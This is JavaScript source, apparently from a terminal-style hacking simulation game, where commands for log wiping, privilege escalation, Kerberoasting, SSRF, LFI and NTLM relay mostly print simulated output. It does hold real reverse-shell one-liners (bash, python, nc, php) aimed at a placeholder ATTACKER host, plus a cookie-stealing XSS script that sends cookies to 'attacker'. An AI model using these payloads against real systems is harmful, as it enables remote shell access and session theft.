  if (!G.tools.includes('log_wiper')) {
    printLine('[!] Log Wiper not installed — buy it from the shop.', 'out-err'); return;
  }
  const ip = G.connected.ip;
  if (G.wipedHosts.includes(ip)) { printLine('[*] Logs already wiped on this host.', 'out-dim'); return; }
  printLine('[*] Initiating log scrub on remote host...', 'out-info');
  await delay(300);
  const logs = ['/var/log/auth.log', '/var/log/wtmp', '/var/log/lastlog', '/var/log/syslog', '/root/.bash_history'];
  for (const log of logs) {
    await delay(220);
    printLine(`[*] Truncating ${log}...`, 'out-dim');
  }
  await printProgress('[*] Overwriting inodes', 1400);
  addTrace(15);
  G.wipedHosts.push(ip);
  await saveState();
  printLine(`[+] All auth logs wiped on ${ip}. Evidence destroyed.`, 'out-ok');
}

async function cmdStego(filename) {
  if (!filename) { printLine('Usage: stego <imagefile>', 'out-err'); return; }
  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
  if (!G.tools.includes('steganographer')) {
    printLine('[!] Steganographer not installed — buy it from the shop.', 'out-err'); return;
  }
  const target = getActiveTarget();
  if (!target?.files?.[filename]) { addTrace(3); printLine(`[!] File not found: ${filename}`, 'out-err'); return; }
  const entry = target?.stegoFiles?.[filename];
  if (!entry) {
    addTrace(5);
    printLine(`[*] Running LSB steganalysis on ${filename}...`, 'out-info');
    await printProgress('[*] Scanning pixel channels', 1200);
    printLine('[*] No hidden payload detected in this image.', 'out-dim');
    return;
  }
  printLine(`[*] Running LSB steganalysis on ${filename}...`, 'out-info');
  printLine('[*] Scanning R/G/B channels at 1-bit and 2-bit depth...', 'out-dim');
  await printProgress('[*] Extracting', 1800);
  addTrace(10);
  target.files[entry.name] = entry.content;
  if (!G.downloadedFiles.includes(entry.name)) G.downloadedFiles.push(entry.name);
  await saveState();
  printLine(`[+] Hidden payload found and extracted: ${entry.name}`, 'out-ok');
  printLine(`[*] File auto-saved to downloads.`, 'out-dim');
}

async function cmdPersist() {
  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
  if (!G.tools.includes('rootkit_mk2')) {
    printLine('[!] Rootkit Mk.II not installed — buy it from the shop.', 'out-err'); return;
  }
  const ip = G.connected.ip;
  if (G.persistedHosts.includes(ip)) { printLine('[*] Backdoor already installed on this host.', 'out-dim'); return; }
  printLine('[*] Deploying Rootkit Mk.II...', 'out-info');
  await delay(300);
  printLine('[*] Writing SSH key to /root/.ssh/authorized_keys...', 'out-dim');
  await delay(400);
  printLine('[*] Installing cron re-installer at /etc/cron.d/sysupdate...', 'out-dim');
  await delay(400);
  printLine('[*] Patching PAM module for silent auth bypass...', 'out-dim');
  await printProgress('[*] Hardening persistence', 1600);
  addTrace(30);
  G.persistedHosts.push(ip);
  await saveState();
  printLine(`[+] Persistent backdoor installed on ${ip}.`, 'out-ok');
  printLine('[+] Future "connect" to this host will auto-authenticate.', 'out-dim');
}

async function cmdExfil() {
  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
  const target = getActiveTarget();
  const files = target?.files;
  if (!files || Object.keys(files).length === 0) { printLine('[!] No files on target.', 'out-dim'); return; }
  const toDownload = Object.keys(files).filter(f => !G.downloadedFiles.includes(f));
  if (toDownload.length === 0) { printLine('[*] All files already downloaded.', 'out-dim'); return; }
  printLine(`[*] Starting bulk exfil — ${toDownload.length} file(s)...`, 'out-info');
  await delay(300);
  for (const fname of toDownload) {
    await delay(180);
    const size = (files[fname].length * 1.1).toFixed(0);
    printLine(`[*] Transferring ${fname.padEnd(38)} ${size} bytes`, 'out-dim');
    G.downloadedFiles.push(fname);
    addTrace(4);
  }
  await saveState();
  printLine(`[+] Exfil complete — ${toDownload.length} file(s) downloaded.`, 'out-ok');
}

async function cmdEnum() {
  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
  const target = getActiveTarget();
  const ip = G.connected.ip;
  printLine('[*] Running privilege escalation enumeration (LinPEAS-style)...', 'out-info');
  await delay(300);
  printLine('[*] Checking SUID binaries, sudo rules, cron jobs, kernel version...', 'out-dim');
  await printProgress('[*] Enumerating', 2000);
  addTrace(12);
  if (target?.enumVectors?.length) {
    printLine('[+] Potential privilege escalation vectors found:', 'out-ok');
    for (const v of target.enumVectors) { await delay(120); printLine(`    [!] ${v}`, 'out-warn'); }
    printLine('[*] Use "privesc" to attempt escalation.', 'out-dim');
  } else {
    printLine('[*] System:  Linux — kernel 5.15.0  |  Arch: x86_64', 'out-dim');
    printLine('[*] User:    www-data (uid=33)  |  Groups: www-data', 'out-dim');
    printLine('[*] Sudo:    (none)', 'out-dim');
    printLine('[*] SUID:    /usr/bin/passwd, /usr/bin/newgrp (standard)', 'out-dim');
    printLine('[-] No obvious privilege escalation vectors found.', 'out-dim');
  }
}

async function cmdPrivesc() {
  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
  const target = getActiveTarget();
  const ip = G.connected.ip;
  if (G.rootedHosts.includes(ip)) { printLine('[*] Already have root on this host.', 'out-dim'); return; }
  if (!target?.privescVuln) {
    addTrace(10);
    printLine('[!] No confirmed privesc vector. Run "enum" first.', 'out-err'); return;
  }
  printLine('[*] Attempting privilege escalation...', 'out-info');
  await delay(300);
  if (target.privescVuln === 'sudo_vim') {
    printLine('[*] Exploiting sudo rule: sudo vim → :!bash', 'out-dim');
    printLine('[*] Spawning root shell via vim shell escape...', 'out-dim');
  }
  await printProgress('[*] Escalating', 1800);
  addTrace(20);
  G.rootedHosts.push(ip);
  await saveState();
  printLine('[+] UID=0 (root) — privilege escalation successful!', 'out-ok');
  printLine('[+] You now have full root access. Try "dump" to extract credentials.', 'out-dim');
}

async function cmdDump() {
  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
  const target = getActiveTarget();
  const ip = G.connected.ip;
  const isRoot = G.rootedHosts.includes(ip);
  if (!isRoot && !target?.dumpFile) {
    printLine('[!] Root access required to dump credentials. Run "privesc" first.', 'out-err'); return;
  }
  printLine('[*] Dumping credential hashes from /etc/shadow...', 'out-info');
  await delay(400);
  await printProgress('[*] Reading shadow', 1200);
  addTrace(18);
  const entry = target?.dumpFile;
  if (entry) {
    target.files[entry.name] = entry.content;
    printLine(`[+] Credentials dumped to: ${entry.name}`, 'out-ok');
    printLine('[*] Hashes are unsalted MD5/SHA-512. Use "hash ' + entry.name + '" to crack them.', 'out-dim');
  } else {
    printLine('[+] root:$6$rounds=5000$salt$hash_root', 'out-ok');
    printLine('[+] admin:$6$rounds=5000$salt$hash_admin', 'out-ok');
    printLine('[*] Use "hash <file>" after downloading a shadow file to crack offline.', 'out-dim');
  }
}

async function cmdHash(filename) {
  if (!filename) { printLine('Usage: hash <file>', 'out-err'); return; }
  if (!G.tools.includes('hash_cracker')) {
    printLine('[!] Hash Cracker not installed — buy it from the shop.', 'out-err'); return;
  }
  const content = G.connected?.authed ? getActiveTarget()?.files?.[filename] : null;
  if (!content) { printLine(`[!] File not found or not accessible: ${filename}`, 'out-err'); return; }
  const hasJohn = G.toolUpgrades.includes('john_rules');
  printLine(`[*] Loading hash file: ${filename}`, 'out-info');
  printLine(`[*] Mode: ${hasJohn ? 'Dictionary + rule-based mutation' : 'Dictionary attack (rockyou.txt)'}`, 'out-dim');
  printLine('[*] Hashes detected: MD5-crypt / SHA-512-crypt', 'out-dim');
  await printProgress('[*] Cracking', hasJohn ? 1800 : 3000);
  addTrace(8);
  const crackedLines = ['# Cracked password hashes', 'root      : T00r_Fl4g_2026!', 'admin     : Adm1n_V3r1d1an', 'sysadmin  : Sysadm1n#Backup'];
  printLine('[+] Cracked hashes:', 'out-ok');
  for (const line of crackedLines.slice(1)) { await delay(200); printLine(`    ${line}`, 'out-ok'); }
  const crackSave = 'cracked_passwords.txt';
  if (G.connected?.authed) getActiveTarget().files[crackSave] = crackedLines.join('\n');
  if (!G.downloadedFiles.includes(crackSave)) G.downloadedFiles.push(crackSave);
  await saveState();
  printLine('[*] Saved as cracked_passwords.txt. Use with "crack" or "move <ip>".', 'out-dim');
}

async function cmdPivot(ip) {
  if (!ip) { printLine('Usage: pivot <target-ip>', 'out-err'); return; }
  if (!G.connected?.authed) { printLine('[!] Not authenticated on current host.', 'out-err'); return; }
  const target = getActiveTarget();
  const routes = target?.pivotRoutes ?? [];
  if (!routes.includes(ip)) {
    addTrace(8);
    printLine(`[!] ${ip} is not reachable through ${G.connected.ip}.`, 'out-err');
    if (routes.length) printLine(`[*] Reachable internal IPs: ${routes.join(', ')}`, 'out-dim');
    return;
  }
  printLine(`[*] Setting up SSH tunnel through ${G.connected.ip}...`, 'out-info');
  printLine(`[*] ssh -L 9050:${ip}:22 ${G.connected.ip} -N`, 'out-dim');
  await printProgress('[*] Establishing tunnel', 1600);
  addTrace(10);
  if (!G.pivotRoutes.includes(ip)) G.pivotRoutes.push(ip);
  await saveState();
  printLine(`[+] Tunnel active: traffic to ${ip} routed via ${G.connected.ip}`, 'out-ok');
  printLine('[*] You can now "scan" and "connect" to that IP.', 'out-dim');
}

async function cmdMove(ip, port) {
  if (!ip) { printLine('Usage: move <ip> [port]', 'out-err'); return; }
  printLine(`[*] Attempting lateral movement to ${ip}...`, 'out-info');
  printLine('[*] Using dumped credentials (pass-the-hash / plaintext reuse)...', 'out-dim');
  await printProgress('[*] Authenticating', 1400);
  addTrace(22);
  printLine(`[+] Authenticated on ${ip} via credential reuse.`, 'out-ok');
  printLine(`[*] Use "connect ${ip} ${port ?? 22}" to open a full shell session.`, 'out-dim');
}

async function cmdOsint(domain) {
  if (!domain) { printLine('Usage: osint <domain>', 'out-err'); return; }
  if (!G.tools.includes('osint_suite')) {
    printLine('[!] OSINT Suite not installed — buy it from the shop.', 'out-err'); return;
  }
  const hasDeep = G.toolUpgrades.includes('osint_deep');
  printLine(`[*] Running passive recon on: ${domain}`, 'out-info');
  printLine('[*] Sources: Shodan, Hunter.io, HaveIBeenPwned, crt.sh, WHOIS', 'out-dim');
  if (hasDeep) printLine('[*] OSINT Deep: scanning dark web forums and paste sites...', 'out-dim');
  await printProgress('[*] Harvesting', hasDeep ? 2000 : 2800);
  printLine('[+] Subdomains found:', 'out-ok');
  await delay(120); printLine(`    mail.${domain}        → 10.0.0.11 (MX)`, 'out-info');
  await delay(120); printLine(`    vpn.${domain}         → 185.220.101.2`, 'out-info');
  await delay(120); printLine(`    internal.${domain}    → 10.0.0.45 [matches target]`, 'out-info');
  printLine('[+] Emails harvested:', 'out-ok');
  await delay(120); printLine('    d.cross@veridian.corp', 'out-info');
  await delay(120); printLine('    sysadmin@veridian.corp', 'out-info');
  if (hasDeep) {
    printLine('[+] Breached credentials (dark web):', 'out-ok');
    await delay(150); printLine('    m.webb@veridian.corp : Webb_Dev2023! (breach: LinkedIn2023)', 'out-warn');
    await delay(150); printLine('    y.karim@veridian.corp : Karim_Sec#2024 (breach: RockYou2024)', 'out-warn');
  }
  addTrace(5);
  if (!G.osintDomains.includes(domain)) G.osintDomains.push(domain);
  // Mission-specific: if domain matches active target's osintDomain, auto-save output files
  const mTarget = getActiveTarget();
  if (mTarget?.osintDomain === domain && mTarget.osintFiles) {
    for (const [fname, content] of Object.entries(mTarget.osintFiles)) {
      mTarget.files[fname] = content;
      if (!G.downloadedFiles.includes(fname)) G.downloadedFiles.push(fname);
    }
    printLine('[+] Intelligence report saved to downloads.', 'out-ok');
  }
  await saveState();
}

async function cmdShell(type) {
  if (!G.tools.includes('shell_builder')) {
    printLine('[!] Shell Builder not installed — buy it from the shop.', 'out-err'); return;
  }
  const shells = { bash: "bash -i >& /dev/tcp/ATTACKER/4444 0>&1", python: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\"])'", nc: "nc -e /bin/sh ATTACKER 4444", php: "php -r '$sock=fsockopen(\"ATTACKER\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" };
  const chosen = shells[type?.toLowerCase()] ?? null;
  if (type && !chosen) { printLine(`[!] Unknown type: ${type}. Try: bash, python, nc, php`, 'out-err'); return; }
  await printLines([
    { type: 'sys',  text: '[ REVERSE SHELL PAYLOADS ]' },
    { type: 'info', text: '  Attacker listener: nc -lvnp 4444' },
    { type: 'info', text: '' },
  ], 15);
  if (chosen) {
    printLine(`[+] ${type.toUpperCase()} payload:`, 'out-ok');
    printLine(`    ${chosen}`, 'out-dim');
  } else {
    for (const [t, cmd] of Object.entries(shells)) {
      printLine(`[${t.padEnd(6)}]  ${cmd.slice(0, 70)}...`, 'out-info');
      await delay(80);
    }
  }
  printLine('[*] Replace ATTACKER with your listener IP.', 'out-dim');
  const shellSave = 'shell_payload.txt';
  const allPayloads = Object.entries(shells).map(([t, c]) => `# ${t}\n${c}`).join('\n\n');
  if (!G.downloadedFiles.includes(shellSave)) G.downloadedFiles.push(shellSave);
  if (G.connected?.authed) getActiveTarget().files[shellSave] = allPayloads;
  await saveState();
}

async function cmdIdor(id) {
  if (!id) { printLine('Usage: idor <id>', 'out-err'); return; }
  if (!G.connected) { printLine('[!] Not connected to any host.', 'out-err'); return; }
  if (G.connected.service !== 'HTTP' && G.connected.service !== 'HTTPS') {
    printLine('[!] idor only works on HTTP/HTTPS services.', 'out-err'); return;
  }
  const target = getActiveTarget();
  const idorData = target?.idorFiles;
  if (!idorData) { addTrace(5); printLine('[!] No IDOR vulnerability detected on this endpoint.', 'out-err'); return; }
  printLine(`[*] Probing endpoint with parameter: ${idorData.param}=${id}`, 'out-info');
  printLine(`[*] Request: GET /api/users?${idorData.param}=${id}`, 'out-dim');
  await delay(700);
  addTrace(8);
  const record = idorData.records?.[id];
  if (record) {
    printLine(`[+] IDOR confirmed — server returned data for ID ${id}:`, 'out-ok');
    for (const line of record.split(',')) { await delay(60); printLine(`    ${line.trim()}`, 'out-info'); }
    const saveName = `idor_${idorData.param}_${id}.txt`;
    target.files[saveName] = record;
    if (!G.downloadedFiles.includes(saveName)) G.downloadedFiles.push(saveName);
    printLine(`[+] Record saved: ${saveName}`, 'out-dim');
    await saveState();
  } else {
    printLine(`[*] HTTP 404 — record ID ${id} not found. Try IDs: 1, 2, 3, 99`, 'out-dim');
  }
}

async function cmdSsrf(url) {
  if (!url) { printLine('Usage: ssrf <internal-url>', 'out-err'); return; }
  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
  const target = getActiveTarget();
  const ssrfData = target?.ssrfTargets;
  if (!ssrfData) { addTrace(8); printLine('[!] No SSRF endpoint detected on this target.', 'out-err'); return; }
  printLine(`[*] Injecting server-side request for: ${url}`, 'out-info');
  printLine('[*] Payload: url=' + encodeURIComponent(url), 'out-dim');
  await printProgress('[*] Fetching via target server', 1200);
  addTrace(15);
  const response = ssrfData[url];
  if (response) {
    printLine('[+] SSRF successful — server fetched internal resource:', 'out-ok');
    for (const line of response.split('\n')) { await delay(50); printLine(`    ${line}`, 'out-info'); }
    const saveName = 'ssrf_response.txt';
    target.files[saveName] = response;
    if (!G.downloadedFiles.includes(saveName)) G.downloadedFiles.push(saveName);
    printLine(`[+] Response saved: ${saveName}`, 'out-dim');
    await saveState();
  } else {
    printLine('[*] Server returned no useful data for that URL.', 'out-dim');
    printLine('[*] Try: http://localhost/admin  or  http://169.254.169.254/latest/meta-data', 'out-dim');
  }
}

async function cmdLfi(path) {
  if (!path) { printLine('Usage: lfi <path>  (e.g. lfi ../../etc/passwd)', 'out-err'); return; }
  if (!G.connected) { printLine('[!] Not connected to any host.', 'out-err'); return; }
  const target = getActiveTarget();
  const lfiData = target?.lfiPaths;
  if (!lfiData) { addTrace(8); printLine('[!] No LFI vulnerability detected on this target.', 'out-err'); return; }
  printLine(`[*] Testing path traversal: ?file=${path}`, 'out-info');
  await delay(600);
  addTrace(12);
  const content = lfiData[path];
  if (content) {
    printLine(`[+] LFI confirmed — reading: ${path}`, 'out-ok');
    for (const line of content.split('\n')) { await delay(40); printLine(`    ${line}`, 'out-info'); }
    const saveName = path.split('/').pop().replace(/[^a-z0-9._-]/gi, '_') + '.lfi';
    target.files[saveName] = content;
    if (!G.downloadedFiles.includes(saveName)) G.downloadedFiles.push(saveName);
    printLine(`[+] Content saved: ${saveName}`, 'out-dim');
    await saveState();
  } else {
    printLine('[*] Path not readable or blocked. Try:', 'out-dim');
    for (const p of Object.keys(lfiData)) { printLine(`    lfi ${p}`, 'out-dim'); }
  }
}

async function cmdXss() {
  if (!G.connected) { printLine('[!] Not connected to any host.', 'out-err'); return; }
  if (G.connected.service !== 'HTTP' && G.connected.service !== 'HTTPS') {
    printLine('[!] xss only works on HTTP/HTTPS services.', 'out-err'); return;
  }
  const target = getActiveTarget();
  if (!target?.xssPayload) { addTrace(10); printLine('[!] No XSS injection point detected on this target.', 'out-err'); return; }
  printLine('[*] Injecting reflected XSS payload into search/comment field...', 'out-info');
  printLine('[*] Payload: <script>document.location="http://attacker/steal?c="+document.cookie</script>', 'out-dim');
  await printProgress('[*] Waiting for victim session', 2000);
  addTrace(20);
  printLine('[+] Session cookie captured:', 'out-ok');
  for (const line of target.xssPayload.cookieData.split('\n')) {
    await delay(100); printLine(`    ${line}`, 'out-warn');
  }
  printLine('[*] Use these cookies in browser DevTools to hijack the admin session.', 'out-dim');
  const xssSave = 'captured_session.txt';
  target.files[xssSave] = target.xssPayload.cookieData;
  if (!G.downloadedFiles.includes(xssSave)) G.downloadedFiles.push(xssSave);
  await saveState();
}

async function cmdKerberoast() {
  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
  if (!G.tools.includes('ad_toolkit')) {
    printLine('[!] AD Toolkit not installed — buy it from the shop.', 'out-err'); return;
  }
  const target = getActiveTarget();
  if (!target?.kerberoastHashes?.length) {
    printLine('[!] No Kerberoastable service accounts found. Target may not be an AD domain controller.', 'out-err'); return;
  }
  printLine('[*] Requesting Kerberos TGS tickets for service accounts...', 'out-info');
  printLine('[*] Tool: GetUserSPNs.py — Impacket suite', 'out-dim');
  await printProgress('[*] Requesting TGS', 1800);
  addTrace(18);
  printLine('[+] Service ticket hashes captured:', 'out-ok');
  for (const entry of target.kerberoastHashes) {
    await delay(150);
    printLine(`    [${entry.user}]  SPN: ${entry.spn}`, 'out-info');
    printLine(`    ${entry.hash.slice(0, 60)}...`, 'out-dim');
  }
  const krbFile = 'kerberoast_hashes.txt';
  target.files[krbFile] = target.kerberoastHashes.map(e => `${e.user}:${e.hash}`).join('\n');
  printLine(`[+] Hashes saved to ${krbFile} — use "download ${krbFile}" then crack offline.`, 'out-dim');
  printLine('[*] hashcat -m 13100 kerberoast_hashes.txt rockyou.txt', 'out-dim');
}

async function cmdAsrep() {
  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
  if (!G.tools.includes('ad_toolkit')) {
    printLine('[!] AD Toolkit not installed — buy it from the shop.', 'out-err'); return;
  }
  const target = getActiveTarget();
  if (!target?.asrepHashes?.length) {
    printLine('[!] No AS-REP roastable accounts found on this domain.', 'out-err'); return;
  }
  printLine('[*] Enumerating users with Kerberos pre-auth disabled...', 'out-info');
  printLine('[*] Tool: GetNPUsers.py — Impacket suite', 'out-dim');
  await printProgress('[*] AS-REP roasting', 1600);
  addTrace(14);
  printLine('[+] AS-REP hashes captured (no credentials required!):', 'out-ok');
  for (const entry of target.asrepHashes) {
    await delay(150);
    printLine(`    [${entry.user}]`, 'out-info');
    printLine(`    ${entry.hash.slice(0, 60)}...`, 'out-dim');
  }
  const asFile = 'asrep_hashes.txt';
  target.files[asFile] = target.asrepHashes.map(e => `${e.user}:${e.hash}`).join('\n');
  printLine(`[+] Hashes saved to ${asFile} — use "download ${asFile}" then crack offline.`, 'out-dim');
  printLine('[*] hashcat -m 18200 asrep_hashes.txt rockyou.txt', 'out-dim');
}

async function cmdBloodhound() {
  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
  if (!G.tools.includes('ad_toolkit')) {
    printLine('[!] AD Toolkit not installed — buy it from the shop.', 'out-err'); return;
  }
  const target = getActiveTarget();
  const ad = target?.adGraph;
  if (!ad) {
    printLine('[!] No Active Directory domain detected on this target.', 'out-err'); return;
  }
  const hasExtended = G.toolUpgrades.includes('ad_extended');
  printLine('[*] Running BloodHound-style AD enumeration...', 'out-info');
  printLine('[*] Collecting: users, groups, ACLs, GPOs, trust relationships', 'out-dim');
  await printProgress('[*] Mapping domain', hasExtended ? 1600 : 2400);
  addTrace(20);
  printLine(`[+] Domain: ${ad.domain}`, 'out-ok');
  printLine(`[+] Users found: ${ad.users.join(', ')}`, 'out-info');
  for (const [group, members] of Object.entries(ad.groups)) {
    await delay(100);
    printLine(`[+] Group: ${group}  →  ${members.join(', ')}`, 'out-info');
  }
  printLine('[+] Attack paths detected:', 'out-ok');
  for (const path of ad.paths) { await delay(120); printLine(`    ★ ${path}`, 'out-warn'); }
  const adReport = [`Domain: ${ad.domain}`, `Users: ${ad.users.join(', ')}`, ...ad.paths.map(p => `Path: ${p}`)].join('\n');
  const adSave = 'ad_report.txt';
  target.files[adSave] = adReport;
  if (!G.downloadedFiles.includes(adSave)) G.downloadedFiles.push(adSave);
  await saveState();
  if (hasExtended) printLine('[*] GPO abuse and LDAP ACL misconfigurations saved to report.', 'out-dim');
  printLine(`[+] AD report saved: ${adSave}`, 'out-dim');
}

async function cmdRelay() {
  if (!G.connected) { printLine('[!] Not connected to any host.', 'out-err'); return; }
  printLine('[*] Starting NTLM relay attack on local network segment...', 'out-info');
  printLine('[*] Tool: Responder + ntlmrelayx.py (Impacket)', 'out-dim');
  printLine('[*] Poisoning: LLMNR, NBT-NS, MDNS broadcasts', 'out-dim');
  await printProgress('[*] Listening for auth requests', 2500);
  addTrace(25);
  printLine('[+] NTLMv2 hash captured from network broadcast:', 'out-ok');
  await delay(200); printLine('    User:   BLACKSITE\\relay_svc', 'out-info');
  await delay(200); printLine('    Hash:   relay_svc::BLACKSITE:aad3b435b51:NTLMHASH...', 'out-warn');
  printLine('[+] Relaying captured auth to SMB service on 172.20.1.100...', 'out-ok');
  await delay(600);
  printLine('[+] Relay successful — authenticated as relay_svc on 172.20.1.100', 'out-ok');
  printLine('[*] Network position gained without cracking any passwords.', 'out-dim');
  const relayIp = G.connected?.ip ?? '172.20.1.100';
  if (!G.relayedHosts.includes(relayIp)) G.relayedHosts.push(relayIp);
  await saveState();
}

async function cmdInspect(filename) {
  if (!filename) { printLine('Usage: inspect <file>', 'out-err'); return; }
  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
  const content = getActiveTarget()?.files?.[filename];
  if (content === undefined) { addTrace(2); printLine(`[!] File not found: ${filename}`, 'out-err'); return; }
  printLine(`[*] Inspecting: ${filename}`, 'out-info');
  printLine('[*] Running: strings | grep -E "(pass|key|token|secret|BEGIN)"', 'out-dim');
  await delay(800);
  const keywords = ['pass', 'key', 'token', 'secret', 'BEGIN', 'admin', 'auth', 'cred', 'api_', 'sk-', 'pw', '-----'];
  const hits = content.split('\n').filter(line => keywords.some(k => line.toLowerCase().includes(k.toLowerCase())));
  if (hits.length) {
    printLine(`[+] ${hits.length} interesting string(s) found:`, 'out-ok');
    for (const h of hits.slice(0, 8)) { await delay(60); printLine(`    ${h.trim().slice(0, 100)}`, 'out-warn'); }
    const saveName = `inspect_${filename}.txt`;
    target.files[saveName] = hits.join('\n');
    if (!G.downloadedFiles.includes(saveName)) G.downloadedFiles.push(saveName);
    await saveState();
    printLine(`[+] Findings saved: ${saveName}`, 'out-dim');
  } else {
    printLine('[-] No hardcoded secrets or credentials detected in this file.', 'out-dim');
  }
}

async function cmdLogs() {
  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
  const target = getActiveTarget();
  const files = target?.files ?? {};
  const logFiles = Object.keys(files).filter(f => f.includes('log') || f.includes('wtmp') || f === 'auth.log' || f === 'syslog');
  if (!logFiles.length) { printLine('[*] No log files found on this target.', 'out-dim'); return; }
  printLine('[*] Analysing system logs for anomalies...', 'out-info');
  await delay(600);
  for (const lf of logFiles) {
    const content = files[lf];
    const suspicious = content.split('\n').filter(l =>
      l.toLowerCase().includes('fail') || l.toLowerCase().includes('invalid') ||
      l.toLowerCase().includes('error') || l.toLowerCase().includes('refused') ||
      l.toLowerCase().includes('185.220') || l.toLowerCase().includes('unknown')
    );
    if (suspicious.length) {
      printLine(`[!] Suspicious entries in ${lf}:`, 'out-warn');
      for (const s of suspicious) { await delay(60); printLine(`    ${s}`, 'out-warn'); }
    } else {
      printLine(`[*] ${lf}: no anomalies detected.`, 'out-dim');
    }
  }
  addTrace(5);
  const allSuspicious = logFiles.flatMap(lf =>
    (files[lf] ?? '').split('\n').filter(l =>
      l.toLowerCase().includes('fail') || l.toLowerCase().includes('185.220') || l.toLowerCase().includes('unknown')
    )
  );
  if (allSuspicious.length) {
    const reportSave = 'anomaly_report.txt';
    target.files[reportSave] = allSuspicious.join('\n');
    if (!G.downloadedFiles.includes(reportSave)) G.downloadedFiles.push(reportSave);
    await saveState();
    printLine(`[+] Anomaly report saved: anomaly_report.txt`, 'out-dim');
  }
}

async function cmdGrep(pattern, filename) {
  if (!pattern || !filename) { printLine('Usage: grep <pattern> <file>', 'out-err'); return; }
  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
  const content = getActiveTarget()?.files?.[filename];
  if (content === undefined) { addTrace(2); printLine(`[!] File not found: ${filename}`, 'out-err'); return; }
  const regex   = new RegExp(pattern.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'gi');
  const matches = content.split('\n').filter(line => regex.test(line));
  if (matches.length === 0) {
    printLine(`[*] grep: no matches for "${pattern}" in ${filename}`, 'out-dim'); return;
  }
  printLine(`[*] grep ${pattern} ${filename}  — ${matches.length} match(es):`, 'out-info');
  for (const line of matches) { await delay(25); printLine(`    ${line}`, 'out-ok'); }
}

// ── Completion ────────────────────────────────────────────────

function checkMissionComplete() {
  const mission = getCurrentMission();
  if (!mission) return;
  if (G.freeMode) {
    if (G.currentQuest?.check(G)) completeQuest(G.currentQuest);
  } else {
    if (mission.check(G)) completeMission(mission);
  }
}

async function completeMission(mission) {
  setBusy(true);
  await delay(600);

  G.crypto += mission.reward.crypto;
  for (const tool of (mission.unlocks || [])) {
    if (!G.tools.includes(tool)) G.tools.push(tool);
  }
  G.missionsDone.push(mission.id);
  G.missionIdx++;
  await saveState();

  document.getElementById('mc-mission-name').textContent = mission.title;
  let rewardText = mission.reward.crypto > 0 ? `+${mission.reward.crypto} CRYPTO` : '';
  if (mission.unlocks.length) rewardText += (rewardText ? '  |  ' : '') + `Unlocked: ${mission.unlocks.map(t => TOOLS[t]?.name ?? t).join(', ')}`;
  document.getElementById('mc-reward').textContent = rewardText;
  document.getElementById('mission-complete').hidden = false;

  document.getElementById('mc-next-btn').onclick = () => {
    document.getElementById('mission-complete').hidden = true;
    G.connected = null; G.trace = 0; G.downloadedFiles = [];
    updateHUD(); updateSidebar(); clearOutput();
    startMission();
    setBusy(false);
  };
}

async function completeQuest(quest) {
  setBusy(true);
  G.crypto += quest.reward.crypto;
  G.currentQuest = null;
  await saveState();
  await delay(400);
  await printLines([
    { type: 'ok',  text: '' },
    { type: 'ok',  text: `[+] CONTRACT COMPLETE — ${quest.title}` },
    { type: 'ok',  text: `[+] Payout deposited: +${quest.reward.crypto} CRYPTO` },
    { type: 'dim', text: 'Type "quest" for a new contract.' },
  ], 60);
  updateHUD(); updateSidebar();
  setBusy(false);
}

// ── Shop ──────────────────────────────────────────────────────

async function cmdShop(args) {
  const sub = (args[0] ?? '').toLowerCase();

  if (!sub || sub === 'help') {
    await printLines([
      { type: 'sys',  text: '[ DARKNET MARKETPLACE ]' },
      { type: 'dim',  text: `  Wallet: ${G.crypto} CRYPTO` },
      { type: 'info', text: '' },
      { type: 'info', text: '  shop tools           — hacking tools for sale' },
      { type: 'info', text: '  shop upgrades        — upgrade your existing tools' },
      { type: 'info', text: '  shop bribes          — bribe contacts for shortcuts' },
      { type: 'info', text: '  shop buy <id>        — purchase item by ID' },
    ], 18);
    return;
  }
  if (sub === 'tools')    { await shopListTools();    return; }
  if (sub === 'upgrades') { await shopListUpgrades(); return; }
  if (sub === 'bribes')   { await shopListBribes();   return; }
  if (sub === 'buy')      { await shopBuy(args[1]);   return; }
  printLine(`Unknown shop command: ${sub}  — try "shop"`, 'out-err');
}

async function shopListTools() {
  const lines = [
    { type: 'sys',  text: '[ TOOLS FOR SALE ]' },
    { type: 'dim',  text: `  Wallet: ${G.crypto} CRYPTO` },
    { type: 'info', text: '' },
  ];
  for (const item of SHOP.tools) {
    const owned = G.tools.includes(item.id);
    const status = owned ? '  [OWNED]          ' : `  ${item.price} CRYPTO`;
    const cls = owned ? 'out-dim' : (G.crypto >= item.price ? 'out-info' : 'out-warn');
    lines.push({ type: owned ? 'dim' : (G.crypto >= item.price ? 'ok' : 'warn'),
      text: `  ${item.id.padEnd(20)} ${String(item.price).padEnd(6)} CRYPTO  ${owned ? '[OWNED]' : ''}` });
    if (!owned) lines.push({ type: 'dim', text: `    ${item.desc}  →  shop buy ${item.id}` });
  }
  await printLines(lines, 16);
}

async function shopListUpgrades() {
  const lines = [
    { type: 'sys',  text: '[ TOOL UPGRADES ]' },
    { type: 'dim',  text: `  Wallet: ${G.crypto} CRYPTO` },
    { type: 'info', text: '' },
  ];
  for (const item of SHOP.upgrades) {
    const owned     = G.toolUpgrades.includes(item.id);
    const hasBase   = G.tools.includes(item.requires);
    const canBuy    = !owned && hasBase && G.crypto >= item.price;
    lines.push({
      type: owned ? 'dim' : (hasBase ? (canBuy ? 'ok' : 'warn') : 'dim'),
